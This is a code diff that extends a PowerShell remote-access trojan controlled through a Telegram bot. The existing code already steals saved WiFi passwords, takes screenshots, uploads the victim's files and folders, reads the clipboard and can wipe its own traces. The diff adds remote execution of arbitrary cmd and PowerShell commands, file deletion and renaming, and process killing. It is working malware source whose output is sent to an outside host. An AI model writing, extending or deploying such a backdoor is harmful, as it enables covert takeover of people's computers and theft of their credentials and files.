@@ -298,38 +298,239 @@ Remove-Item -Path "$($MyInvocation.MyCommand.Path)" -Force
     }
 }
 
+function Send-TgMessage($ChatId, $Text) {
+    $payload = @{
+        chat_id = $ChatId
+        text    = $Text.Substring(0, [Math]::Min(4000, $Text.Length)) 
+    }
+    Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -ContentType "application/json" -Body ($payload | ConvertTo-Json -Depth 3 -Compress)
+}
+
+function Run-LocalCommand($Command, $ShellType) {
+    try {
+        if ($ShellType -eq "powershell") {
+            $Output = powershell -NoProfile -Command $Command 2>&1 | Out-String
+        }
+        else {
+            $Output = cmd.exe /c $Command 2>&1 | Out-String
+        }
+    }
+    catch {
+        $Output = $_.Exception.Message
+    }
+    return $Output
+}
+
+# New file operation functions
+function Remove-FileOrFolder {
+    param (
+        [string]$chatId,
+        [string]$path
+    )
+    
+    try {
+        if (-not [System.IO.Path]::IsPathRooted($path)) {
+            $path = Join-Path $global:CurrentDirectory $path
+        }
+        
+        if (Test-Path $path) {
+            if (Test-Path $path -PathType Container) {
+                Remove-Item -Path $path -Recurse -Force
+                return "Folder deleted: $path"
+            } else {
+                Remove-Item -Path $path -Force
+                return "File deleted: $path"
+            }
+        } else {
+            return "Path not found: $path"
+        }
+    } catch {
+        return "Error deleting $path`: $_"
+    }
+}
+
+function Rename-FileOrFolder {
+    param (
+        [string]$chatId,
+        [string]$oldPath,
+        [string]$newPath
+    )
+    
+    try {
+        if (-not [System.IO.Path]::IsPathRooted($oldPath)) {
+            $oldPath = Join-Path $global:CurrentDirectory $oldPath
+        }
+        
+        if (-not [System.IO.Path]::IsPathRooted($newPath)) {
+            $newPath = Join-Path $global:CurrentDirectory $newPath
+        }
+        
+        if (Test-Path $oldPath) {
+            Move-Item -Path $oldPath -Destination $newPath -Force
+            return "Renamed/Moved: $oldPath → $newPath"
+        } else {
+            return "Source path not found: $oldPath"
+        }
+    } catch {
+        return "Error renaming/moving: $_"
+    }
+}
+
+
+
+
+
+function Get-RunningProcesses {
+    try {
+        $processes = Get-Process | Select-Object Id, ProcessName, CPU, WorkingSet, StartTime | Sort-Object CPU -Descending | Select-Object -First 20
+        
+        $result = "Top 20 Running Processes:`n"
+        $result += "ID    | Process Name          | CPU Time    | Memory (MB) | Start Time`n"
+        $result += "------|----------------------|-------------|-------------|-----------`n"
+        
+        foreach ($proc in $processes) {
+            $memoryMB = [math]::Round($proc.WorkingSet / 1MB, 2)
+            $startTime = if ($proc.StartTime) { $proc.StartTime.ToString("HH:mm:ss") } else { "N/A" }
+            $result += "{0,-5} | {1,-20} | {2,-11} | {3,-11} | {4}`n" -f $proc.Id, $proc.ProcessName, $proc.CPU, $memoryMB, $startTime
+        }
+        
+        return $result
+    } catch {
+        return "Error retrieving process list: $_"
+    }
+}
+
+function Kill-ProcessById {
+    param (
+        [string]$chatId,
+        [int]$processId
+    )
+    
+    try {
+        $process = Get-Process -Id $processId -ErrorAction Stop
+        $processName = $process.ProcessName
+        Stop-Process -Id $processId -Force
+        return "Process killed: $processName (PID: $processId)"
+    } catch {
+        return "Error killing process with PID $processId`: $_"
+    }
+}
+
+function Get-WindowsServices {
+    try {
+        $services = Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, Status, StartType | Sort-Object Name | Select-Object -First 30
+        
+        $result = "Running Windows Services (Top 30):`n"
+        $result += "Service Name        | Display Name                    | Status  | Start Type`n"
+        $result += "-------------------|--------------------------------|---------|-----------`n"
+        
+        foreach ($service in $services) {
+            $result += "{0,-18} | {1,-30} | {2,-7} | {3}`n" -f $service.Name, $service.DisplayName.Substring(0, [Math]::Min(30, $service.DisplayName.Length)), $service.Status, $service.StartType
+        }
+        
+        return $result
+    } catch {
+        return "Error retrieving services: $_"
+    }
+}
+
+function Get-TaskList {
+    try {
+        $processes = Get-Process | Select-Object Id, ProcessName, CPU, WorkingSet, StartTime | Sort-Object WorkingSet -Descending | Select-Object -First 25
+        
+        $result = "Task List (Top 25 by Memory Usage):`n"
+        $result += "Image Name         | PID    | Mem Usage | Status | CPU Time | Window Title`n"
+        $result += "-------------------|--------|-----------|--------|----------|-------------`n"
+        
+        foreach ($proc in $processes) {
+            $memoryMB = [math]::Round($proc.WorkingSet / 1MB, 2)
+            $cpuTime = if ($proc.CPU) { $proc.CPU.ToString("F2") } else { "0.00" }
+            $result += "{0,-18} | {1,-6} | {2,-9} | {3,-6} | {4,-8} | {5}`n" -f $proc.ProcessName, $proc.Id, "$memoryMB MB", "Running", $cpuTime, "N/A"
+        }
+        
+        return $result
+    } catch {
+        return "Error retrieving task list: $_"
+    }
+}
+
+function Kill-ProcessByName {
+    param (
+        [string]$chatId,
+        [string]$processName
+    )
+    
+    try {
+        $processes = Get-Process -Name $processName -ErrorAction Stop
+        
+        if ($processes.Count -eq 0) {
+            return "No processes found with name: $processName"
+        }
+        
+        $processes | Stop-Process -Force
+        return "Killed $($processes.Count) process(es) with name: $processName"
+    } catch {
+        return "Error killing processes with name '$processName`: $_"
+    }
+}
+
 function Send-HelpMessage {
     param ([string]$chatId)
     $helpMessage = @"
-Available Commands:
+================= AVAILABLE COMMANDS =================
 
-/help - Displays this help message.
-/notepad - Opens Notepad.
-/visit <url> - Opens a URL in the browser.
-/lock - Locks workstation.
-/restart - Restarts the computer.
-/shutdown - Shuts down the computer.
-/ip - Shows local and public IP.
-/screenshot - Sends a screenshot.
-/pcname - Shows the computer name.
-/sendfile <path> - Sends a file from local disk.
-/sendfolder <path> - Sends a zipped folder from local disk.
-/getclipboard - Gets text from clipboard.
-/setclipboard <text> - Sets text to clipboard.
-/sysinfo - Displays detailed system information.
-/wifi - Shows all saved WiFi networks and passwords.
-/selfdestruct - Removes all traces of the script and terminates.
-cd <path> - Change directory.
-cd - Show current directory.
-ls or dir - List files and folders.
+FILE OPERATIONS
+------------------------------------------------------
+/delete <path>         Delete a file or folder
+/rename <old> <new>    Rename or move a file or folder
+/getfile <path>        Send a file from local disk
+/getfolder <path>      Send a zipped folder from local disk
+
+MONITORING & CONTROL
+------------------------------------------------------
+/processes             List running processes
+/kill <pid>            Terminate a process by PID
+/services              List Windows services and their status
+/tasklist              Same as tasklist command
+/taskkill <name>       Kill processes by name
+
+SYSTEM CONTROL
+------------------------------------------------------
+/help                  Displays this help message
+/notepad               Opens Notepad
+/visit <url>           Opens a URL in the browser
+/lock                  Locks workstation
+/restart               Restarts the computer
+/shutdown              Shuts down the computer
+/ip                    Shows local and public IP
+/screenshot            Sends a screenshot
+/pcname                Shows the computer name
+/getclipboard          Gets text from clipboard
+/setclipboard <text>   Sets text to clipboard
+/sysinfo               Displays detailed system information
+/wifi                  Shows all saved WiFi networks and passwords
+/selfdestruct          Removes all traces of the script and terminates
+
+FILE SYSTEM
+------------------------------------------------------
+cd <path>              Change directory
+cd                     Show current directory
+ls or dir              List files and folders
+
+COMMAND EXECUTION
+------------------------------------------------------
+/cmd <command>         Execute CMD command
+/powershell <command>  Execute PowerShell command
+
+======================================================
 "@
     Send-TelegramMessage -chatId $chatId -message $helpMessage
 }
 
 # --- ALL FUNCTION DEFINITIONS END HERE ---
 
-$botToken = "meowurtoken"
-$userId = "uruserid"
+$botToken = "urtoken"
+$userId = "urid"
 $apiUrl = "https://api.telegram.org/bot$botToken"
 $lastUpdateId = 0 # Initial default
 
@@ -393,24 +594,43 @@ while ($true) {
 
             if ($chatId -ne $userId) { continue }
 
+
+
             if ($text -match "^cd\s+(.*)") {
-                $targetPath = $matches[1].Trim('"')
-                if (-not [System.IO.Path]::IsPathRooted($targetPath)) {
-                    $targetPath = Join-Path $global:CurrentDirectory $targetPath
-                }
-                if (Test-Path $targetPath -PathType Container) {
-                    $global:CurrentDirectory = (Resolve-Path $targetPath).Path
-                    $reply = "Changed directory to: $global:CurrentDirectory"
-                } else {
-                    $reply = "Directory not found: $targetPath"
-                }
-            }
-            elseif ($text -match "^cd$") {
-                $reply = "Current directory: $global:CurrentDirectory"
-            }
+				$targetPath = $matches[1].Trim('"')
+
+				# If the path is relative, resolve it against current directory
+				if (-not [System.IO.Path]::IsPathRooted($targetPath)) {
+					$targetPath = Join-Path $global:CurrentDirectory $targetPath
+				}
+
+				try {
+					if ($targetPath -like "\\*") {
+						# UNC path: use Push-Location temporarily to verify it exists
+						Push-Location $targetPath
+						Pop-Location
+						$global:CurrentDirectory = $targetPath
+						$reply = "Changed directory to UNC/network path: $targetPath"
+					}
+					elseif (Test-Path $targetPath -PathType Container) {
+						# Local path (includes OneDrive)
+						Set-Location $targetPath
+						$global:CurrentDirectory = (Resolve-Path $targetPath).Path
+						$reply = "Changed directory to: $global:CurrentDirectory"
+					}
+					else {
+						$reply = "Directory not found: $targetPath"
+					}
+				} catch {
+					$reply = "Failed to access directory: $_"
+				}
+			}
+			elseif ($text -match "^cd$") {
+				$reply = "Current directory: $global:CurrentDirectory"
+			}
 			elseif ($text -match "^(ls|dir)$") {
 				try {
-					$items = Get-ChildItem -Path $global:CurrentDirectory
+					$items = Get-ChildItem -Path $global:CurrentDirectory -Force
 					$reply = if ($items) {
 						$list = foreach ($item in $items) {
 							if ($item.PSIsContainer) {
@@ -475,14 +695,14 @@ while ($true) {
                 $success = Send-Screenshot -chatId $chatId
                 $reply = if ($success) { "Screenshot sent." } else { "Failed to capture screenshot." }
             }
-            elseif ($text -match "^/sendfile\s+(.+)$") {
+            elseif ($text -match "^/getfile\s+(.+)$") {
                 $filePath = $matches[1].Trim('"')
                 if (-not [System.IO.Path]::IsPathRooted($filePath)) {
                     $filePath = Join-Path $global:CurrentDirectory $filePath
                 }
                 $reply = Send-TelegramFile -chatId $chatId -filePath $filePath
             }
-            elseif ($text -match "^/sendfolder\s+(.+)$") {
+            elseif ($text -match "^/getfolder\s+(.+)$") {
                 $folderPath = $matches[1].Trim('"')
                 if (-not [System.IO.Path]::IsPathRooted($folderPath)) {
                     $folderPath = Join-Path $global:CurrentDirectory $folderPath
@@ -506,6 +726,7 @@ while ($true) {
                 $wifiPasswords = Get-WifiPasswords
                 $reply = $wifiPasswords
             }
+
             elseif ($text -eq "/selfdestruct") {
                 Send-TelegramMessage -chatId $chatId -message "Are you sure you want to remove all traces of this script? Send '/confirm-selfdestruct' to confirm."
                 continue
@@ -514,10 +735,49 @@ while ($true) {
                 Invoke-SelfDestruct -chatId $chatId
                 continue
             }
-            else {
-                $reply = "Unknown command."
+            # New file operation commands
+            elseif ($text -match "^/delete\s+(.+)$") {
+                $path = $matches[1].Trim('"')
+                $reply = Remove-FileOrFolder -chatId $chatId -path $path
+            }
+            elseif ($text -match "^/rename\s+(.+?)\s+(.+)$") {
+                $oldPath = $matches[1].Trim('"')
+                $newPath = $matches[2].Trim('"')
+                $reply = Rename-FileOrFolder -chatId $chatId -oldPath $oldPath -newPath $newPath
             }
 
+
+            elseif ($text -eq "/processes") {
+                $reply = Get-RunningProcesses
+            }
+            elseif ($text -match "^/kill\s+(\d+)$") {
+                $processId = [int]$matches[1]
+                $reply = Kill-ProcessById -chatId $chatId -processId $processId
+            }
+            elseif ($text -eq "/services") {
+                $reply = Get-WindowsServices
+            }
+            elseif ($text -eq "/tasklist") {
+                $reply = Get-TaskList
+            }
+            elseif ($text -match "^/taskkill\s+(.+)$") {
+                $processName = $matches[1].Trim()
+                $reply = Kill-ProcessByName -chatId $chatId -processName $processName
+            }
+			elseif ($text -like "/cmd*") {
+                $Command = $text -replace "^/cmd\s*", ""
+                $Result  = Run-LocalCommand $Command "cmd"
+                Send-TgMessage $chatId "CMD> $Command`n`n$Result"
+            }
+            elseif ($text -like "/powershell*") {
+                $Command = $text -replace "^/powershell\s*", ""
+                $Result  = Run-LocalCommand $Command "powershell"
+                Send-TgMessage $chatId "PS> $Command`n`n$Result"
+            }
+			else {
+				$reply = "Unknown command."
+				Send-TelegramMessage -chatId $chatId -message $reply
+			}
             Send-TelegramMessage -chatId $chatId -message $reply
         }
         Start-Sleep -Seconds 2
